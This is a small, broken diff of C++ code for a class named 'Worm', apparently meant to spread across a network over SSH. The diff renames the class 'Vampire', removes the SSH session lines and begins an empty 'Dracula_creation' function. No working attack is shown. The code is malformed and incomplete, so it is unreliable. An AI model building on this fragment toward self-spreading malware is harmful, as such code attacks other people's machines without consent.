@@ -11,16 +11,13 @@
 #include <sstream>          // For string stream operations to parse IP addresses
 
 // Worm class 
-class Worm {
+class Vampire {
 private:
     std::string network;  // Store network address as a string
 
 public:
     // Constructor to initialize the network address
-    Worm(const std::string& network_address) : network(network_address) {}
-                my_ssh_session = ssh_new();  // Create new SSH session
-                if (my_ssh_session == NULL) {  // it will Check if session creation was successful
-                    continue;
-                }   
-
+    Vampire(const std::string& network_address) : network(network_address) {}
+               std::vector<std::string> Dracula_creation(){
+                   
              
